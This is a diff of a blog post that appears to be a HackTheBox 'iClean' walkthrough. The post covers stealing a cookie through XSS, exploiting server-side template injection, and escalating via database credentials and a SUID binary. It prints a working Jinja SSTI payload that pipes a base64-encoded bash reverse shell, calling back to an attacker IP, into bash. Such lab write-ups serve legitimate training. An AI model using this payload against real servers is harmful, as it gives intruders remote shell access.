@@ -1,7 +1,7 @@
 ---
 layout: post
 title: HTB - iClean Walkthrough
-categories: [HTB, Writeups]
+categories: [HackTheBox, Writeups]
 date: 2024-08-28 09:45 +0200
 media_subpath: /assets/images
 ---
@@ -39,25 +39,25 @@ Visiting the site and we get redirected to capiclean.htb so we add it to the hos
 
 I ran a vhost scan and a directory scan and found nothing interesting. I'm thinking of using the names found on the main page to find a valid login for someone. The only intractable thing here was a page to get a quote where you could input an email and what services you'd like. I was able to find a xss vulnerability that made it possible for me to get the cookie of whoever sees the request:
 
-![](20240723152713.png)
+![Burp](20240723152713.png)
 
 With the cookie set I was able to explore to the dashboard at /dashboard where I get offered a few functions
 
-![](20240723152958.png)
+![Dashboard options](20240723152958.png)
 
 Generate Invoice seems interesting since it is is getting stored somewhere which we can check with Generate QR. Anything that haven't been seen before by us is invalid so there is some kind of database storing these. Apparently I wasted a lot of time thinking this was sqli when it was ssti
 
 ## Exploitation
 
 To exploit the ssti we have to attempt to generate a printable invoice that has qr_code parameter as input. If we put `{{7*7}}` in there for example we get 49 on the final page. And we can use this for shell:
-
+{% raw %}
 ```
 {% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMzQvNDQ0NCAwPiYx | base64 -d | bash")["read"]() %} a {% endwith %}
 ```
-
+{% endraw %}
 but urlencoded ofc:
 
-![](20240723170155.png)
+![Burp request](20240723170155.png)
 
 ## Escalation
 
@@ -73,6 +73,6 @@ IN the database we could read the credentials of the users. Consuela had the has
 
 The rest was pretty easy. There was a suid binary that I could use to read the root flag in some way which was this:
 
-![](20240723175427.png)
+![Escalation](20240723175427.png)
 
 I had to input a real pdf file so I just uploaded one from my side.
